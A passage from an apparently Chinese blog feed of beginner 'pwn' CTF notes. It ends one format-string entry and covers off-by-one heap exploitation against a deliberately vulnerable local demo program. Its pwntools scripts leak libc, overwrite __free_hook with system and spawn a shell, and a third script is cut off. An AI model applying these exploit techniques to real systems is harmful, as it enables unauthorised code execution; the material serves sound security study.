fmtstr_payload(4,&#123;0x80EBF9C:28&#125;)</span><br><span class=\"line\">sh.sendline(payload)</span><br><span class=\"line\">sh.interactive()</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n\n\n\n\n\n\n<h2 id=\"pwn9\"><a href=\"#pwn9\" class=\"headerlink\" title=\"pwn9\"></a><strong>pwn9</strong></h2><figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">int sub_8048945()</span><br><span class=\"line\">&#123;</span><br><span class=\"line\">  char v1; // [esp+0h] [ebp-1B8h]</span><br><span class=\"line\">  char v2; // [esp+150h] [ebp-68h]</span><br><span class=\"line\"></span><br><span class=\"line\">  _IO_puts(&quot;please input your username&quot;);</span><br><span class=\"line\">  __libc_read(0, &amp;v2, 32);</span><br><span class=\"line\">  _IO_puts(&quot;please input your passwd&quot;);</span><br><span class=\"line\">  __libc_read(0, &amp;v1, 335);</span><br><span class=\"line\">  return sub_80488E7(&amp;v1);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<p>不存在溢出</p>\n<p>后面函数是往一个地址写数据..有什么用呢?</p>\n<p>有后们函数,所以应该是要覆盖字符串,或者说字符串复制</p>\n<p>0x08048948 覆盖为 0x80488CE(system)</p>\n<p>第一次写入要覆盖的地址,第二次覆盖</p>\n<h1 id=\"问题\"><a href=\"#问题\" class=\"headerlink\" title=\"问题\"></a>问题</h1><p>回头有时间可以自己编译一下符号</p>\n<p>​\t这样其实有问题,不太对,因为ebp那里的值其实是不确定的,但总是会往前指,或多或少,有时候正好指到shellcode开头或者偏移一点点,至于为什么呢…可以后面在研究</p>\n<p>哪个都行, 不过有一个问题就是,这个值会是固定的嘛…</p>\n<p>plt的过程再熟悉下</p>\n",
            "tags": [
                "PWN入门"
            ]
        },
        {
            "id": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/",
            "url": "https://tangzichengcc.github.io/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/",
            "title": "pwn入门-29-off—by-one",
            "date_published": "2023-06-03T08:04:02.000Z",
            "content_html": "<p>总的感觉就是通过off by null来修改size区域,然后造成堆块合并,使得堆块重叠,可以修改可控堆块,</p>\n<p>主要看了一个这里面的例子:<a href=\"https://www.jianshu.com/p/8eb55c40ec4a\">https://www.jianshu.com/p/8eb55c40ec4a</a> 还有权威指南的pwn书</p>\n<p><a href=\"https://github.com/shellphish/how2heap/blob/master/glibc_2.23/poison_null_byte.c\">https://github.com/shellphish/how2heap/blob/master/glibc_2.23/poison_null_byte.c</a> how2heap的例子也不错</p>\n<p>demo</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdio.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdlib.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;stdint.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;string.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;unistd.h&gt;</span></span></span><br><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">include</span> <span class=\"string\">&lt;assert.h&gt;</span></span></span><br><span class=\"line\"><span class=\"type\">char</span> *ptr[<span class=\"number\">0x100</span>] = &#123;<span class=\"number\">0</span>&#125;;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">menu</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;1.malloc&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;2.edit&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;3.show&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;4.free&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;5.exit&quot;</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">my_malloc</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> index,size;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;index:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;size:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;size);</span><br><span class=\"line\">    ptr[index] = <span class=\"built_in\">malloc</span>(size);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;content:&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>,ptr[index],size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">my_edit</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> index,size;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;index:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;size:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;size);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;content:&quot;</span>);</span><br><span class=\"line\">    read(<span class=\"number\">0</span>,ptr[index],size);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">my_free</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> index;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;index:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">free</span>(ptr[index]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">my_show</span><span class=\"params\">()</span>&#123;</span><br><span class=\"line\">    <span class=\"type\">int</span> index;</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;index:&quot;</span>);</span><br><span class=\"line\">    <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;index);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(ptr[index]);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">main</span><span class=\"params\">()</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdin</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    setbuf(<span class=\"built_in\">stdout</span>, <span class=\"literal\">NULL</span>);</span><br><span class=\"line\">    <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;welcome&quot;</span>);</span><br><span class=\"line\">    <span class=\"keyword\">while</span>(<span class=\"number\">1</span>)&#123;</span><br><span class=\"line\">        <span class=\"type\">int</span> op;</span><br><span class=\"line\">        menu();</span><br><span class=\"line\">        <span class=\"built_in\">scanf</span>(<span class=\"string\">&quot;%d&quot;</span>,&amp;op);</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(op == <span class=\"number\">1</span>) my_malloc();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">2</span>) my_edit();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">3</span>) my_show();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">4</span>) my_free();</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"keyword\">if</span>(op == <span class=\"number\">5</span>) <span class=\"built_in\">exit</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">        <span class=\"keyword\">else</span> <span class=\"built_in\">puts</span>(<span class=\"string\">&quot;invalid!&quot;</span>);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">return</span> <span class=\"number\">0</span>;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​\t这个demo里的edit可以得到任意size,但假设只能溢出1字节</p>\n<h1 id=\"利用1-扩展被释放块\"><a href=\"#利用1-扩展被释放块\" class=\"headerlink\" title=\"利用1:扩展被释放块\"></a>利用1:扩展被释放块</h1><p>​\t利用思路可以总结为通过拓展一个被释放的块,覆盖掉后面的块,<strong>可以修改后面块的内容,比如fd,bk或者函数指针等,从而可以进一步利用</strong></p>\n<p>gcc -g demo.c demo1</p>\n<p>patchelf –set-interpreter ~&#x2F;pwn&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F;ld-linux-x86-64.so.2 .&#x2F;demo1</p>\n<p>patchelf –set-rpath &#x2F;root&#x2F;pwn&#x2F;glibc-all-in-one&#x2F;libs&#x2F;2.27-3ubuntu1_amd64&#x2F; .&#x2F;demo1</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603154728457.png\" alt=\"image-20230603154728457\"></p>\n<p>​\t\t覆盖前</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603135909057.png\" alt=\"image-20230603135909057\"></p>\n<p>​\t\t覆盖后,可以修改后面的bin的内容了,然后再申请后面bin,就可以申请到free_hook等任意地址,进行修改</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603135947149.png\" alt=\"image-20230603135947149\"></p>\n<p>​\t0x51的原因是  0x418 (0x410其实是) + 0x10的头 + 0x20的数据(或者说0x28) + 0x10的头</p>\n<p>​\t所以就等于0x450, 不存在0x458这种,   其实这里改成多少都行,能覆盖到就可以了</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./demo1&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmd</span>(<span class=\"params\">a</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;5.exit&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(a))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">4</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">1</span>,<span class=\"number\">0x418</span>,<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">2</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>)</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x19</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p8(<span class=\"number\">0x51</span>))</span><br><span class=\"line\">alloc(<span class=\"number\">3</span>,<span class=\"number\">0x448</span>,<span class=\"string\">b&#x27;\\xa0&#x27;</span>) <span class=\"comment\"># 0x440 0x448都可以,</span></span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">show(<span class=\"number\">3</span>)</span><br><span class=\"line\">leak_libc = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">libc_base = leak_libc - <span class=\"number\">0x3ebca0</span> <span class=\"comment\"># main+96和libc起始位置偏移</span></span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">system = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#print(hex(leak_libc))</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">3</span>,<span class=\"number\">0x448</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x418</span>+p64(<span class=\"number\">0x31</span>)+p64(free_hook))</span><br><span class=\"line\">alloc(<span class=\"number\">4</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">5</span>,<span class=\"number\">0x28</span>,p64(system))</span><br><span class=\"line\">free(<span class=\"number\">4</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br></pre></td></tr></table></figure>\n\n<p>​\t</p>\n<p>​\t奇怪的是,这里的free(2)为什么没有被合并呢, 一般需要加一个堆块挡着</p>\n<p>​\t</p>\n<h1 id=\"利用2-扩展已分配块\"><a href=\"#利用2-扩展已分配块\" class=\"headerlink\" title=\"利用2: 扩展已分配块\"></a>利用2: 扩展已分配块</h1><p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603154943782.png\" alt=\"image-20230603154943782\"></p>\n<p>​\t\t感觉和1差不多其实,就是换一下顺序</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> pwn <span class=\"keyword\">import</span> *</span><br><span class=\"line\">context.log_level = <span class=\"string\">&#x27;debug&#x27;</span></span><br><span class=\"line\">p = process(<span class=\"string\">&#x27;./demo1&#x27;</span>)</span><br><span class=\"line\">libc = ELF(<span class=\"string\">&#x27;/root/pwn/glibc-all-in-one/libs/2.27-3ubuntu1_amd64/libc.so.6&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">context.terminal = [<span class=\"string\">&#x27;tmux&#x27;</span>, <span class=\"string\">&#x27;splitw&#x27;</span>, <span class=\"string\">&#x27;-h&#x27;</span>]</span><br><span class=\"line\"><span class=\"comment\">#gdb.attach(p)</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">cmd</span>(<span class=\"params\">a</span>):</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;5.exit&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(a))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">alloc</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">1</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">edit</span>(<span class=\"params\">index,size,content</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">2</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;size&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(size))</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;content&#x27;</span>)</span><br><span class=\"line\">    p.send(content)</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">show</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">3</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">free</span>(<span class=\"params\">index</span>):</span><br><span class=\"line\">    cmd(<span class=\"number\">4</span>)</span><br><span class=\"line\">    p.recvuntil(<span class=\"string\">&#x27;index:\\n&#x27;</span>)</span><br><span class=\"line\">    p.sendline(<span class=\"built_in\">str</span>(index))</span><br><span class=\"line\"></span><br><span class=\"line\">alloc(<span class=\"number\">0</span>,<span class=\"number\">0x18</span>,<span class=\"string\">b&#x27;a&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">1</span>,<span class=\"number\">0x418</span>,<span class=\"string\">b&#x27;b&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">2</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;c&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">3</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;d&#x27;</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">edit(<span class=\"number\">0</span>,<span class=\"number\">0x19</span>,p64(<span class=\"number\">0</span>)*<span class=\"number\">3</span>+p8(<span class=\"number\">0x51</span>))</span><br><span class=\"line\">free(<span class=\"number\">1</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">4</span>,<span class=\"number\">0x448</span>,<span class=\"string\">b&#x27;\\xa0&#x27;</span>)</span><br><span class=\"line\">show(<span class=\"number\">4</span>)</span><br><span class=\"line\">leak_libc = u64(p.recv(<span class=\"number\">6</span>).ljust(<span class=\"number\">8</span>,<span class=\"string\">b&quot;\\x00&quot;</span>))</span><br><span class=\"line\">libc_base = leak_libc - <span class=\"number\">0x3ebca0</span> <span class=\"comment\"># main+96和libc起始位置偏移</span></span><br><span class=\"line\">free_hook = libc_base + libc.symbols[<span class=\"string\">&#x27;__free_hook&#x27;</span>]</span><br><span class=\"line\">system = libc_base + libc.symbols[<span class=\"string\">&#x27;system&#x27;</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(<span class=\"built_in\">hex</span>(leak_libc))</span><br><span class=\"line\">free(<span class=\"number\">2</span>)</span><br><span class=\"line\">edit(<span class=\"number\">4</span>,<span class=\"number\">0x448</span>,<span class=\"string\">b&#x27;a&#x27;</span>*<span class=\"number\">0x418</span>+p64(<span class=\"number\">0x31</span>)+p64(free_hook))</span><br><span class=\"line\">alloc(<span class=\"number\">5</span>,<span class=\"number\">0x28</span>,<span class=\"string\">b&#x27;/bin/sh&#x27;</span>)</span><br><span class=\"line\">alloc(<span class=\"number\">6</span>,<span class=\"number\">0x28</span>,p64(system))</span><br><span class=\"line\">free(<span class=\"number\">5</span>)</span><br><span class=\"line\"></span><br><span class=\"line\">p.interactive()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">#pause()</span></span><br></pre></td></tr></table></figure>\n\n\n\n\n\n<h1 id=\"利用3-收缩被释放块-poison-null-byte\"><a href=\"#利用3-收缩被释放块-poison-null-byte\" class=\"headerlink\" title=\"利用3: 收缩被释放块 poison null byte\"></a>利用3: 收缩被释放块 poison null byte</h1><p>​\t权威指南里面的图,还不错</p>\n<p>​\t总的俩说还是造成堆块重叠</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603155836221.png\" alt=\"image-20230603155836221\"><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230603155842598.png\" alt=\"image-20230603155842598\"></p>\n<p>​\t\t博主的图,也不错,不过最后好像少了一块,进行了补全</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/2\" alt=\"img\"></p>\n<img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531202728221.png\" alt=\"image-20230531202728221\" style=\"zoom:50%;\">\n\n\n\n<p>free 5之前</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531203121300.png\" alt=\"image-20230531203121300\"></p>\n<p>free之后tcachebin 0x50多了一项,此时利用edit修改fd,就可以实现任意地址写</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531203247741.png\" alt=\"image-20230531203247741\"></p>\n<p>修改fd后,此时就可以修改hook指针getshell</p>\n<p><img src=\"/pwn%E5%85%A5%E9%97%A8-29-off%E2%80%94by-one/image-20230531203452499.png\" alt=\"image-20230531203452499\"></p>\n<p>exp</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span 